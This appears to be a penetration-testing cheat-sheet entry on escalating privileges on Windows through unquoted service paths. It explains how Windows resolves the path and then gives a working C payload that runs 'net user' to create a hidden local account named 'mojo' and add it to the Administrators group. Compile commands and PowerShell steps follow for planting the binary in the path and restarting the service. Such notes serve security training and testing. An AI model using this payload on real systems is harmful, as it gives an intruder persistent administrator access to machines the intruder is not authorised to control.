# Unquoted Service Paths

Used when we discover a unquoted service that contains a space, and we have write permissions to the directory in the path containing the space.

This is vulnerable due to the way Windows handles spaces in unquoted service paths. By default Windows will append `.exe` everytime the path encounters a space.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

We can exploit this by dropping a malicious binary in our writeable directory named the first word before the space.

**adduser.c**

```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user mojo Password123! /add");
  i = system ("net localgroup administrators mojo /add");
  return 0;
}
```

```bash
# Compile
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
cp .\adduser.exe 'C:\Program Files\My Program\My.exe'
Restart-Service $SERVICE_NAME
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```
